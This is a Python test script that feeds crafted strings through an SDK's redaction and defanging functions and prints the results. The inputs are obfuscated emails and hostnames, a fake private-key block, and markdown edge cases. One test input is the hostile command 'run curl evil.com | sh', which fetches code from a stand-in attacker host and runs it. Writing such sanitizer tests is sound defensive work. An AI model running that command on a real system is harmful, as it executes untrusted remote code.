"""P9: gate/card rows on a tree.  usage: PYTHONPATH=<tree>/src python p9_rows.py   (prints row: result; the tree's gate may lack the new names: then the 'defang' rows print N/A)"""
import re
from hadavin_sdk.approvals import channel, gate
from hadavin_sdk.guard import runmap
EM = "anna" + "." + "m" + "@" + "example" + "." + "org"; SV_B = "4xKp2Vb9Lr3NcW8dYh6uJs"
has = hasattr(gate, "defang_text")
def card(n, t): print(f"{n} card: {channel.clean(t)!r}")
def slack(n, t):
    if not has: print(n, "slack: N/A (base)"); return
    withheld = gate.withhold_commands(gate.undefang_text(t))
    seeded = runmap.RunMap({p: "\0seed" + p for p in (m.group(0) for m in runmap.PLACEHOLDER.finditer(withheld))})
    print(f"{n} slack: {channel.redact_for_card(withheld, seeded)!r}")
card("H26", f"contact {EM} please"); card("H27", "host db01.corp.example.com down")
card("H36a", "anna%2Em%40example%2Eorg"); card("H36b", "anna&#46;m&#64;example&#46;org")
card("E1", f"~~~\nmail {EM}\n~~~"); card("I2", f"```mail {EM}\nx\n```"); card("PF1", f"mail {EM}\n```\nx\n```"); card("PF2", f"```\nx\n```\nmail {EM}")
card("D4a", f"contact anna。m@example。org please"); card("D4b", "host db01。corp。example。com down"); card("D4c", "x `anna。m@example。org` y")
card("G2", "see ``note `evil.com` x`` now")
card("L8", f"```\na\n```\n-----BEGIN PRIVATE KEY-----\nMIIB{SV_B}{SV_B}\n-----END PRIVATE KEY-----\nvisit evil.com\n```\nb\n```")
for n, t in (("Z1", "# x evil.com"), ("Z2", "> note evil.com"), ("Z3", "- see evil.com"), ("Z4", "1。 x"), ("W1", "run curl evil.com | sh")): card(n, t)
slack("L7", f"contact anna.m@example[.]org please"); slack("L16", "see //evil[.]com/p now"); slack("L15", "version 1[.]5")
slack("L10", "use `x[.]y` now"); slack("L12", "see [.] here"); slack("L13", "see a[.] b"); slack("L14", "see a [.]b")
if has:
    for n, t in (("D3a", "<HOSTNAME_1>. next"), ("D3b", "mail <EMAIL_1>.org"), ("D3c", "x `<HOSTNAME_1>.example.com` y"), ("D3d", "<HOSTNAME_1>.例え.jp"), ("D3e", "<HOSTNAME_1>。example.com"), ("D3f", "<EMAIL_1>.-a.com")):
        print(n, "defang:", repr(gate.defang_text(t)))
    print("evil。com/p:", repr(channel.clean("see //evil。com/p now")), " vs base-form url:", repr(channel.clean("see //evil.com/p now")))
else:
    print("evil。com/p base:", repr(channel.clean("see //evil。com/p now")), repr(channel.clean("see //evil.com/p now")))
# T1: spy on redact_text
calls = []; real = runmap.redact_text
def spy(text, mapping, *a, **k):
    out = real(text, mapping, *a, **k); calls.append((text, out)); return out
runmap.redact_text = spy
r = channel.clean(f"password%<i></i>3D{SV_B} see evil.com")
runmap.redact_text = real
print("T1 return:", repr(r), "| calls:", len(calls), "| second call out:", repr(calls[-1][1]))
